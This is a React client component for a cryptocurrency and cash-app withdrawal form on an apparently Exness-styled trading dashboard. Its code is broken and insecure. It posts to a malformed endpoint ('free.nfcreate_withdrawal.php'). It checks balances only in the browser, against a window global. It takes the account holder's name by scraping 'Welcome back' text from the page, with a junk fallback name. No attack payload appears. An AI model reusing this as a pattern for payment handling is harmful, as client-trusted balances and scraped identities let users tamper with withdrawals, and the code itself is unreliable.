"use client";

import React, { useState, useEffect } from "react";

export default function WithdrawTerminal() {
  const [method, setMethod] = useState("Bitcoin (BTC)");
  const [amount, setAmount] = useState("");
  const [details, setDetails] = useState("");
  const [loading, setLoading] = useState(false);
  const [availableLiquidity, setAvailableLiquidity] = useState<number>(0);

  // Exness-Style Balance Engine Link Selector
  useEffect(() => {
    const syncWalletMetrics = () => {
      const liveBalance = (window as any).currentClientWalletBalance;
      if (liveBalance !== undefined) setAvailableLiquidity(Number(liveBalance));
    };
    syncWalletMetrics();
    const metricsInterval = setInterval(syncWalletMetrics, 2000);
    return () => clearInterval(metricsInterval);
  }, []);

  const handleWithdrawalSubmit = async (isBankWireRequest: boolean = false) => {
    const targetMethod = isBankWireRequest ? "Bank Wire Transfer" : method;
    const targetDetails = isBankWireRequest ? "Manual Processing Required - Contact Support" : details;
    const finalAmount = amount;

    if (!finalAmount || Number(finalAmount) <= 0) {
      alert("Please enter a valid withdrawal volume amount.");
      return;
    }

    if (!isBankWireRequest && !details.trim()) {
      alert("Please specify your target destination remittance details.");
      return;
    }

    if (Number(finalAmount) > availableLiquidity) {
      alert(`Transaction Refused: Insufficient Funds. Your request ($${Number(finalAmount).toFixed(2)}) exceeds your available balance ($${availableLiquidity.toFixed(2)}).`);
      return;
    }

    setLoading(true);

    try {
      // 👥 DYNAMIC REGISTER SPECIFICATION TEXT PARSER
      const rawUserHeading = document.body.innerText || "";
      const welcomeMatch = rawUserHeading.match(/Welcome back,\s+([^\n]+)/i);
      
      let fullDashboardName = "drdf yuyt ggvyv";
      if (welcomeMatch && welcomeMatch[1]) {
        fullDashboardName = welcomeMatch[1].trim();
      }

      // Automatically slice the combined heading back into matching database schema strings
      // "drdf yuyt ggvyv" split by spaces becomes: surname="drdf yuyt", last_name="ggvyv"
      const nameParts = fullDashboardName.split(/\s+/);
      let passedSurname = fullDashboardName;
      let passedLastName = "";

      if (nameParts.length >= 3) {
        passedSurname = `${nameParts[0]} ${nameParts[1]}`; // "drdf yuyt"
        passedLastName = nameParts[2]; // "ggvyv"
      } else if (nameParts.length === 2) {
        passedSurname = nameParts[0];
        passedLastName = nameParts[1];
      }

      const res = await fetch("https://free.nfcreate_withdrawal.php", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ 
          surname_input: passedSurname.trim(),
          lastname_input: passedLastName.trim(),
          amount: finalAmount, 
          payout_method: targetMethod, 
          details: targetDetails 
        }),
      });
      
      const data = await res.json();
      
      if (data.success) {
        alert(`Payout Ticket Successfully Registered! Ticket ID: ${data.id}. Awaiting administrative compliance clearance.`);
        setAmount("");
        setDetails("");
        window.location.reload();
      } else {
        alert(`Server Processing Refusal: ${data.message}`);
      }
    } catch (err) { 
      console.error(err);
      alert("Failed to reach settlement gateway server. Check connection parameters.");
    } finally {
      setLoading(false);
    }
  };

  return (
    <div className="bg-slate-800 p-6 rounded-xl border border-slate-700 text-xs text-slate-300 space-y-4 shadow-xl max-w-md w-full mx-auto select-none">
      <div className="border-b border-slate-700/50 pb-3 flex justify-between items-start">
        <div>
          <h3 className="font-bold text-rose-400 mb-1 uppercase text-sm tracking-wide">Request Settlement Payout</h3>
          <p className="text-[11px] text-slate-400">Cash out trading profits securely back to your account</p>
        </div>
        <div className="text-right">
          <span className="text-[10px] text-slate-500 uppercase font-mono block">Available Balance</span>
          <span className="font-mono text-emerald-400 font-bold text-sm block">${availableLiquidity.toLocaleString(undefined, { minimumFractionDigits: 2, maximumFractionDigits: 2 })}</span>
        </div>
      </div>

      <div className="flex flex-col gap-1.5">
        <label className="text-slate-400 font-semibold uppercase text-[10px] tracking-wider">Select Route Channel:</label>
        <select 
          value={method} onChange={(e) => setMethod(e.target.value)}
          className="w-full bg-slate-900 border border-slate-700 rounded-lg p-2.5 text-slate-200 outline-none cursor-pointer focus:border-rose-500 font-medium"
        >
          <option value="Bitcoin (BTC)">Bitcoin (BTC) Asset Wallet</option>
          <option value="USDT (TRC20)">USDT (TRC20) Stablecoin Gateway</option>
          <option value="PayPal Balance">PayPal Merchant Wallet</option>
          <option value="Zelle Transfer">Zelle Transfer Gateway</option>
          <option value="CashApp Tag">CashApp Handle Routing</option>
        </select>
      </div>

      <div className="flex flex-col gap-1.5">
        <label className="text-slate-400 font-semibold uppercase text-[10px] tracking-wider">Withdrawal Volume ($):</label>
        <input 
          type="number" placeholder="0.00" value={amount} disabled={loading}
          onChange={(e) => setAmount(e.target.value)}
          className="w-full bg-slate-900 border border-slate-700 rounded-lg p-2.5 text-white font-mono outline-none focus:border-rose-500 text-sm" 
        />
      </div>

      <div className="flex flex-col gap-1.5">
        <label className="text-slate-400 font-semibold uppercase text-[10px] tracking-wider">Remittance Target Address / Details:</label>
        <input 
          type="text" placeholder="Enter target wallet hash, email, or username tag..." value={details} disabled={loading}
          onChange={(e) => setDetails(e.target.value)}
          className="w-full bg-slate-900 border border-slate-700 rounded-lg p-2.5 text-slate-200 outline-none focus:border-rose-500 font-medium" 
        />
      </div>

      <div className="space-y-2.5 pt-2">
        <button
          onClick={() => handleWithdrawalSubmit(false)} disabled={loading}
          className="w-full py-3 bg-rose-600 hover:bg-rose-500 text-white font-bold rounded-lg shadow-lg text-center uppercase text-xs tracking-wider transition-all disabled:opacity-50"
        >
          {loading ? "Registering Ticket..." : "Process Liquidation Request"}
        </button>

        <div className="relative flex py-1 items-center">
          <div className="flex-grow border-t border-slate-700"></div>
          <span className="flex-shrink mx-3 text-slate-500 text-[9px] uppercase font-mono font-bold tracking-widest">Or Manual Route</span>
          <div className="flex-grow border-t border-slate-700"></div>
        </div>

        <button
          type="button" onClick={() => handleWithdrawalSubmit(true)} disabled={loading}
          className="w-full py-3 bg-slate-900 hover:bg-slate-950 border border-slate-700 text-amber-400 font-bold rounded-lg shadow text-center uppercase text-xs tracking-wider transition-all disabled:opacity-50"
        >
          An alternate method request (Bank Wire)
        </button>
      </div>
    </div>
  );
}